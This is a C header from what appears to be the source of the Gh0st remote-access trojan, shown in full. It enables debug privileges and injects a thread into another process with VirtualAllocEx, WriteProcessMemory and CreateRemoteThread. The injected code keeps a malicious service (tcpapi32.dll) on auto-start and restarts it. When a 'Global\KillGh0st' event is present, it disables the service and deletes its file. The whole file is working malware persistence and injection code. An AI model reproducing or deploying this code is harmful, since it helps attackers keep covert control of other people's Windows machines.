#if !defined(AFX_INJECT_H_INCLUDED)
#define AFX_INJECT_H_INCLUDED

#include <windows.h>
#include <Tlhelp32.h>
extern DWORD GetProcessID(LPCTSTR lpProcessName);

#define THREADSIZE 1024 * 10 //should be big enough

typedef SC_HANDLE	(__stdcall *TOpenSCManager)(LPCTSTR, LPCTSTR, DWORD);
typedef SC_HANDLE	(__stdcall *TOpenService)(SC_HANDLE, LPCTSTR, DWORD);
typedef BOOL		(__stdcall *TQueryServiceStatus)(SC_HANDLE, LPSERVICE_STATUS);
typedef BOOL		(__stdcall *TControlService)(SC_HANDLE, DWORD, LPSERVICE_STATUS);
typedef BOOL		(__stdcall *TStartService)(SC_HANDLE, DWORD, LPCTSTR*);
typedef BOOL		(__stdcall *TDeleteService)(SC_HANDLE);
typedef BOOL		(__stdcall *TCloseServiceHandle)(SC_HANDLE);

typedef SC_LOCK		(__stdcall *TLockServiceDatabase)(SC_HANDLE);
typedef BOOL		(__stdcall *TUnlockServiceDatabase)(SC_LOCK);
typedef BOOL		(__stdcall *TChangeServiceConfig)(SC_HANDLE, DWORD, DWORD, DWORD, LPCTSTR, LPCTSTR, LPDWORD, LPCTSTR, LPCTSTR, LPCTSTR, LPCTSTR);

typedef DWORD		(__stdcall *TSHDeleteKey)(HKEY, LPCTSTR);

typedef HANDLE		(__stdcall	*TOpenEvent)(DWORD, BOOL, LPCTSTR);
typedef BOOL		(__stdcall	*TCloseHandle)(HANDLE);
typedef VOID		(__stdcall	*TSleep)(DWORD);
typedef BOOL		(__stdcall	*TDeleteFile)(LPCTSTR);


typedef struct
{
	TOpenSCManager		MyOpenSCManager;
	TOpenService		MyOpenService;
	TQueryServiceStatus	MyQueryServiceStatus;
	TControlService		MyControlService;
	TStartService		MyStartService;
	TDeleteService		MyDeleteService;
	TCloseServiceHandle	MyCloseServiceHandle;
	TLockServiceDatabase	MyLockServiceDatabase;
	TUnlockServiceDatabase	MyUnlockServiceDatabase;
	TChangeServiceConfig	MyChangeServiceConfig;

	TSHDeleteKey		MySHDeleteKey;

	TOpenEvent			MyOpenEvent;
	TCloseHandle		MyCloseHandle;
	TSleep				MySleep;
	TDeleteFile			MyDeleteFile;

	char				strServiceFile[100];	// 服务文件路径，删除服务时删除文件
	char				strServiceName[100];	// 服务名称
	char				strServiceRegKey[100];	// 服务在注册表中的位置
	char				strKillEvent[50];		// 删除服务的事件名称，如"Global\\IPRIP" if(OpenEvent(EVENT_ALL_ACCESS, false, "Global\\IPRIP") == NULL)...
	
}REMOTE_PARAMETER, *PREMOTE_PARAMETER;

bool EnableDebugPriv(void)
{
	HANDLE hToken;
	LUID sedebugnameValue;
	TOKEN_PRIVILEGES tkp;
	if (!OpenProcessToken(GetCurrentProcess(),TOKEN_ADJUST_PRIVILEGES|TOKEN_QUERY,&hToken))
		return false;
	if (!LookupPrivilegeValue(NULL,SE_DEBUG_NAME,&sedebugnameValue))
	{
		CloseHandle(hToken);
		return false;
	}
	tkp.PrivilegeCount = 1;
	tkp.Privileges[0].Luid = sedebugnameValue;
	tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
	if(!AdjustTokenPrivileges(hToken,FALSE,&tkp,sizeof(tkp),NULL,NULL))
	{
		CloseHandle(hToken);
		return false;
	}
	CloseHandle(hToken);

	return true;
}

DWORD __stdcall MyFunc(LPVOID lparam)
{
	REMOTE_PARAMETER	*pRemoteParam = (REMOTE_PARAMETER *)lparam;
	SC_HANDLE			service = NULL, scm = NULL;
	SERVICE_STATUS		Status;
	HANDLE				hEvent = NULL;
	SC_LOCK				sclLock;
	do 
	{
		pRemoteParam->MySleep(1000);
		scm = pRemoteParam->MyOpenSCManager(0, 0,
			SC_MANAGER_CREATE_SERVICE);
		service = pRemoteParam->MyOpenService(
			scm, pRemoteParam->strServiceName,
			SERVICE_ALL_ACCESS | DELETE);
		if (scm==NULL&&service == NULL)
			break;

		if (!pRemoteParam->MyQueryServiceStatus(service, &Status))
			break;


		hEvent = pRemoteParam->MyOpenEvent(EVENT_ALL_ACCESS, false, pRemoteParam->strKillEvent);

		if (hEvent == NULL)
		{
			sclLock = pRemoteParam->MyLockServiceDatabase(scm);
			pRemoteParam->MyChangeServiceConfig( 
				service,        // handle of service 
				SERVICE_NO_CHANGE, // service type: no change 
				SERVICE_AUTO_START, // 这里做了更改
				SERVICE_NO_CHANGE, // error control: no change 
				NULL,              // binary path: no change 
				NULL,              // load order group: no change 
				NULL,              // tag ID: no change 
				NULL,              // dependencies: no change 
				NULL,              // account name: no change
				NULL,          // password: no change
				NULL);
			pRemoteParam->MyUnlockServiceDatabase(sclLock);
			if (Status.dwCurrentState != SERVICE_RUNNING)
			{
				if (!pRemoteParam->MyStartService(service, 0, NULL))
					continue;
				// startservice ok, exit because service will create a new thread to moniter
				break;
			}
		}
		else
		{
			if (Status.dwCurrentState != SERVICE_STOPPED)
			{
				if (!pRemoteParam->MyControlService(service, SERVICE_CONTROL_STOP, &Status))
					break;
				// Wait to service stopped
				pRemoteParam->MySleep(1000);
			}

			sclLock = pRemoteParam->MyLockServiceDatabase(scm);
			pRemoteParam->MyChangeServiceConfig( 
				service,        // handle of service 
				SERVICE_NO_CHANGE, // service type: no change 
				SERVICE_DISABLED, // 这里做了更改
				SERVICE_NO_CHANGE, // error control: no change 
				NULL,              // binary path: no change 
				NULL,              // load order group: no change 
				NULL,              // tag ID: no change 
				NULL,              // dependencies: no change 
				NULL,              // account name: no change
				NULL,          // password: no change
				NULL);
			pRemoteParam->MyUnlockServiceDatabase(sclLock);
			// delete service
			// pRemoteParam->MyDeleteService(service);
			// delete regkey
			//pRemoteParam->MySHDeleteKey(HKEY_LOCAL_MACHINE, pRemoteParam->strServiceRegKey);
			// delete file
			pRemoteParam->MyDeleteFile(pRemoteParam->strServiceFile);
			// close event handle
			pRemoteParam->MyCloseHandle(hEvent);
			break;			
		}
	} while(1);

	if (service != NULL)
		pRemoteParam->MyCloseServiceHandle(service);
	if (scm != NULL)
		pRemoteParam->MyCloseServiceHandle(scm);
	
	return 0;
}

bool Inject(LPCTSTR lpProcessName, char *lpServiceName)
{
	EnableDebugPriv();
	HANDLE hProcess;
	hProcess = OpenProcess(PROCESS_ALL_ACCESS, false, GetProcessID(lpProcessName));
	
	if (hProcess == NULL)
		return false;
	//////////////////////////////////////////////////////////////////////////
	REMOTE_PARAMETER	remoteParameter;
	memset(&remoteParameter, 0, sizeof(remoteParameter));

	HMODULE hAdvapi32 = LoadLibrary("advapi32.dll");
	remoteParameter.MyOpenSCManager = (TOpenSCManager)GetProcAddress(hAdvapi32, "OpenSCManagerA");
	remoteParameter.MyOpenService = (TOpenService)GetProcAddress(hAdvapi32, "OpenServiceA");
	remoteParameter.MyQueryServiceStatus = (TQueryServiceStatus)GetProcAddress(hAdvapi32, "QueryServiceStatus");
	remoteParameter.MyControlService = (TControlService)GetProcAddress(hAdvapi32, "ControlService");
	remoteParameter.MyStartService = (TStartService)GetProcAddress(hAdvapi32, "StartServiceA");
	remoteParameter.MyDeleteService = (TDeleteService)GetProcAddress(hAdvapi32, "DeleteService");
	remoteParameter.MyCloseServiceHandle = (TCloseServiceHandle)GetProcAddress(hAdvapi32, "CloseServiceHandle");
	remoteParameter.MyLockServiceDatabase = (TLockServiceDatabase)GetProcAddress(hAdvapi32, "LockServiceDatabase");
	remoteParameter.MyUnlockServiceDatabase = (TUnlockServiceDatabase)GetProcAddress(hAdvapi32, "UnlockServiceDatabase");
	remoteParameter.MyChangeServiceConfig = (TChangeServiceConfig)GetProcAddress(hAdvapi32, "ChangeServiceConfigA");
	FreeLibrary(hAdvapi32);	

	HMODULE	hShlwapi = LoadLibrary("shlwapi.dll");
	remoteParameter.MySHDeleteKey = (TSHDeleteKey)GetProcAddress(hShlwapi, "SHDeleteKeyA");
	FreeLibrary(hShlwapi);

	HMODULE	hKernel32 = LoadLibrary("kernel32.dll");
	remoteParameter.MySleep = (TSleep)GetProcAddress(hKernel32, "Sleep");
	remoteParameter.MyOpenEvent = (TOpenEvent)GetProcAddress(hKernel32, "OpenEventA");
	remoteParameter.MyCloseHandle = (TCloseHandle)GetProcAddress(hKernel32, "CloseHandle");
	remoteParameter.MyDeleteFile = (TDeleteFile)GetProcAddress(hKernel32, "DeleteFileA");
	FreeLibrary(hKernel32);
	
	lstrcpy(remoteParameter.strServiceName, lpServiceName);
	GetSystemDirectory(remoteParameter.strServiceFile, sizeof(remoteParameter.strServiceFile));
	lstrcat(remoteParameter.strServiceFile, "\\tcpapi32.dll");

	lstrcpy(remoteParameter.strServiceRegKey, "SYSTEM\\CurrentControlSet\\Services\\");
	lstrcat(remoteParameter.strServiceRegKey, remoteParameter.strServiceName);

	lstrcpy(remoteParameter.strKillEvent, "Global\\KillGh0st");
	//////////////////////////////////////////////////////////////////////////

	// Write thread parameter to Remote thread
	void *pDataRemote = (char*)VirtualAllocEx(hProcess, 0, sizeof(remoteParameter),
		MEM_COMMIT, PAGE_READWRITE);
	if (!pDataRemote)
		return false;
	if (!WriteProcessMemory( hProcess, pDataRemote, &remoteParameter, sizeof(remoteParameter), NULL))
		return false;

	// Write Code to Remote thread
	DWORD	cbCodeSize= THREADSIZE; // 分配的空间不大一点，会出错, 过大，WriteProcessMemroy会失败
	PDWORD	pCodeRemote = (PDWORD)VirtualAllocEx(hProcess, 0, cbCodeSize, MEM_COMMIT,
		PAGE_EXECUTE_READWRITE);

	if (!pCodeRemote)	
		return false;

	if (!WriteProcessMemory(hProcess, pCodeRemote, &MyFunc, cbCodeSize, NULL))
		return false;

	if (CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)pCodeRemote, pDataRemote, 0, NULL) == NULL)
		return false;

	return true;
}	
#endif // !defined(AFX_INJECT_H_INCLUDED)